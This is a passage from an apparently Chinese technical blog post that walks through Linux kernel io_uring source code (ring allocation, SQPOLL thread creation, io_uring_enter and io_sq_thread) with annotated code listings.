err_fput;</span><br></pre></td></tr></table></figure><p>错误处理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">err:</span><br><span class="line">io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">fput(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><h4 id="io-allocate-scq-urings"><code>io_allocate_scq_urings</code></h4><p>首先是rings的分配，核心关键点在于NO_MMAP 的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_allocate_scq_urings</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span>;</span></span><br><span class="line"><span class="type">size_t</span> size, sq_array_offset;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure these are sane, as we already accounted them */</span></span><br><span class="line">ctx-&gt;sq_entries = p-&gt;sq_entries;</span><br><span class="line">ctx-&gt;cq_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line">size = rings_size(ctx, p-&gt;sq_entries, p-&gt;cq_entries, &amp;sq_array_offset);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">rings = io_mem_alloc(size);</span><br><span class="line"><span class="comment">// 如果没有设置NO_MMAP，就分配</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">rings = io_rings_map(ctx, p-&gt;cq_off.user_addr, size);</span><br><span class="line"><span class="comment">// 反之，建立映射</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rings))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rings);</span><br><span class="line"></span><br><span class="line">ctx-&gt;rings = rings;</span><br></pre></td></tr></table></figure><p>接下来是类似的，sqe的分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ctx-&gt;sq_array = (u32 *)((<span class="type">char</span> *)rings + sq_array_offset);</span><br><span class="line">rings-&gt;sq_ring_mask = p-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;cq_ring_mask = p-&gt;cq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;sq_ring_entries = p-&gt;sq_entries;</span><br><span class="line">rings-&gt;cq_ring_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">size = array_size(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">size = array_size(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">ptr = io_mem_alloc(size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ptr = io_sqes_map(ctx, p-&gt;sq_off.user_addr, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr)) &#123;</span><br><span class="line">io_rings_free(ctx);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_sqes = ptr;</span><br></pre></td></tr></table></figure><h3 id="io-sq-offload-create"><code>io_sq_offload_create</code></h3><p>如果设置了 SQPOLL， 用来创建内核收割任务的线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_sq_offload_create</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retain compatibility with failing for an invalid attach attempt */</span></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; (IORING_SETUP_ATTACH_WQ | IORING_SETUP_SQPOLL)) ==</span><br><span class="line">IORING_SETUP_ATTACH_WQ) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">f = fdget(p-&gt;wq_fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (!io_is_uring_fops(f.file)) &#123;</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">fdput(f);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span>;</span></span><br><span class="line"><span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">ret = security_uring_sqpoll();</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">sqd = io_get_sq_data(p, &amp;attached);</span><br><span class="line"><span class="comment">// 获取一个sqd </span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sqd)) &#123;</span><br><span class="line">ret = PTR_ERR(sqd);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_creds = get_current_cred();</span><br><span class="line">ctx-&gt;sq_data = sqd;</span><br><span class="line">ctx-&gt;sq_thread_idle = msecs_to_jiffies(p-&gt;sq_thread_idle);</span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;sq_thread_idle)</span><br><span class="line">ctx-&gt;sq_thread_idle = HZ;</span><br><span class="line"><span class="comment">// 设置相关信息</span></span><br><span class="line">io_sq_thread_park(sqd);</span><br><span class="line">list_add(&amp;ctx-&gt;sqd_list, &amp;sqd-&gt;ctx_list);</span><br><span class="line">io_sqd_update_thread_idle(sqd);</span><br><span class="line"><span class="comment">/* don&#x27;t attach to a dying SQPOLL thread, would be racy */</span></span><br><span class="line">ret = (attached &amp;&amp; !sqd-&gt;thread) ? -ENXIO : <span class="number">0</span>;</span><br><span class="line">io_sq_thread_unpark(sqd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"><span class="keyword">if</span> (attached)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="type">int</span> cpu = p-&gt;sq_thread_cpu;</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (cpu &gt;= nr_cpu_ids || !cpu_online(cpu))</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">sqd-&gt;sq_cpu = cpu;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sqd-&gt;sq_cpu = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line">sqd-&gt;task_tgid = current-&gt;tgid;</span><br><span class="line">tsk = create_io_thread(io_sq_thread, sqd, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tsk)) &#123;</span><br><span class="line">ret = PTR_ERR(tsk);</span><br><span class="line"><span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sqd-&gt;thread = tsk;</span><br><span class="line">ret = io_uring_alloc_task_context(tsk, ctx);</span><br><span class="line">wake_up_new_task(tsk);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line"><span class="comment">/* Can&#x27;t have SQ_AFF without SQPOLL */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_sqpoll:</span><br><span class="line">complete(&amp;ctx-&gt;sq_data-&gt;exited);</span><br><span class="line">err:</span><br><span class="line">io_sq_thread_finish(ctx);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-uring-enter"><code>io_uring_enter</code></h3><p>首先是对于flag的检查和确认，这里不一一赘述了，感兴趣的去看相应的man page更能了解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(io_uring_enter, <span class="type">unsigned</span> <span class="type">int</span>, fd, u32, to_submit,</span><br><span class="line">u32, min_complete, u32, flags, <span class="type">const</span> <span class="type">void</span> __user *, argp,</span><br><span class="line"><span class="type">size_t</span>, argsz)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP |</span><br><span class="line">       IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG |</span><br><span class="line">       IORING_ENTER_REGISTERED_RING)))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring fd has been registered via IORING_REGISTER_RING_FDS, we</span></span><br><span class="line"><span class="comment"> * need only dereference our task private array to find it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_REGISTERED_RING) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">fd = array_index_nospec(fd, IO_RINGFD_REG_MAX);</span><br><span class="line">f.file = tctx-&gt;registered_rings[fd];</span><br><span class="line">f.flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">f = fdget(fd);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">ret = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!io_is_uring_fops(f.file)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx = f.file-&gt;private_data;</span><br><span class="line">ret = -EBADFD;</span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SQPOLL模式下,直接返回提交数,可选择性wakeup线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQ polling, the thread will do all submissions and completions.</span></span><br><span class="line"><span class="comment"> * Just return the requested submit count, and wake the thread if</span></span><br><span class="line"><span class="comment"> * we were asked to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">io_cqring_overflow_flush(ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ctx-&gt;sq_data-&gt;thread == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">ret = -EOWNERDEAD;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAKEUP)</span><br><span class="line"><span class="comment">// 这个flag处于和用户态共享的内存 </span></span><br><span class="line"><span class="comment">// 如果sq处理线程休眠了，并需要唤醒</span></span><br><span class="line"><span class="comment">// 可以通过设置 IORING_ENTER_SQ_WAKEUP， 再通过此syscall 来唤醒</span></span><br><span class="line">wake_up(&amp;ctx-&gt;sq_data-&gt;wait);</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAIT)</span><br><span class="line">io_sqpoll_wait_sq(ctx);</span><br><span class="line"></span><br><span class="line">ret = to_submit;</span><br></pre></td></tr></table></figure><p>非SQPOLL模式,执行提交请求到SQ环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (to_submit) &#123;</span><br><span class="line">ret = io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line"><span class="comment">// 直接提交 sqes </span></span><br><span class="line"><span class="comment">// 这个函数将在后面分析</span></span><br><span class="line"><span class="comment">// SQPOLL 模式下创建的io_sq_thread 也会调用此函数</span></span><br><span class="line"><span class="keyword">if</span> (ret != to_submit) &#123;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll)</span><br><span class="line"><span class="keyword">goto</span> iopoll_locked;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ignore errors, we&#x27;ll soon call io_cqring_wait() and</span></span><br><span class="line"><span class="comment"> * it should handle ownership problems if any.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)</span><br><span class="line">(<span class="type">void</span>)io_run_local_work_locked(ctx);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line"><span class="comment">// 如果请求获取完成事件</span></span><br><span class="line"><span class="type">int</span> ret2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;syscall_iopoll) &#123;</span><br><span class="line"><span class="comment">// 如果开启了syscall轮询模式,执行iopoll逻辑 </span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We disallow the app entering submit/complete with</span></span><br><span class="line"><span class="comment"> * polling, but we still need to lock the ring to</span></span><br><span class="line"><span class="comment"> * prevent racing with polled issue that got punted to</span></span><br><span class="line"><span class="comment"> * a workqueue.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">iopoll_locked:</span><br><span class="line">ret2 = io_validate_ext_arg(flags, argp, argsz);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_iopoll_check(ctx, min_complete);</span><br><span class="line">&#125;</span><br><span class="line">mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">sigset_t</span> __user *sig;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">kernel_timespec</span> __<span class="title">user</span> *<span class="title">ts</span>;</span></span><br><span class="line"></span><br><span class="line">ret2 = io_get_ext_arg(flags, argp, &amp;argsz, &amp;ts, &amp;sig);</span><br><span class="line"><span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">min_complete = min(min_complete,</span><br><span class="line">   ctx-&gt;cq_entries);</span><br><span class="line">ret2 = io_cqring_wait(ctx, min_complete, sig,</span><br><span class="line">      argsz, ts);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">ret = ret2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * EBADR indicates that one or more CQE were dropped.</span></span><br><span class="line"><span class="comment"> * Once the user has been informed we can clear the bit</span></span><br><span class="line"><span class="comment"> * as they are obviously ok with those drops.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret2 == -EBADR))</span><br><span class="line">clear_bit(IO_CHECK_CQ_DROPPED_BIT,</span><br><span class="line">  &amp;ctx-&gt;check_cq);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果请求获取完成事件<ul><li>如果开启了syscall轮询模式,执行iopoll逻辑</li><li>否则执行等待完成事件逻辑</li></ul></li></ul><h2 id="kernel-2">kernel</h2><p>最后是io_uring 内核的任务处理, 在这里先给出一个流程图, 然后再具体分析各个函数</p><p><img src="/images/io_uring.png" alt="io_uring"></p><p>图来自 <a href="https://zhuanlan.zhihu.com/p/380726590">https://zhuanlan.zhihu.com/p/380726590</a> , 侵删//</p><h3 id="io-sq-thread-内核任务提交机制"><code>io_sq_thread</code> | 内核任务提交机制</h3><p>io_sq_thread是 <code>SQPOLL</code> 模式下内核任务轮询线程.<br>首先设置线程环境</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_sq_thread</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> timeout = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line">DEFINE_WAIT(wait);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-sqp-%d&quot;</span>, sqd-&gt;task_pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reset to our pid after we&#x27;ve set task_comm, for fdinfo */</span></span><br><span class="line">sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqd-&gt;sq_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpumask_of(sqd-&gt;sq_cpu));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">set_cpus_allowed_ptr(current, cpu_online_mask);</span><br><span class="line">sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来获取锁并进入无限循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure><p>设置好timeout</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_sqd_events_pending(sqd) || signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (io_sqd_handle_event(sqd))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line"><span class="comment">// sq_thread_idle 来自用户在 params 设置的时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这个线程创建在内存分配好之后， 即，即使是第一次进入此线程， 如果 sqes对应内存有任务，也会处理任务， 意味着在 <code>io_uring_setup</code> 之前，在sqes写好的任务，也可以被处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 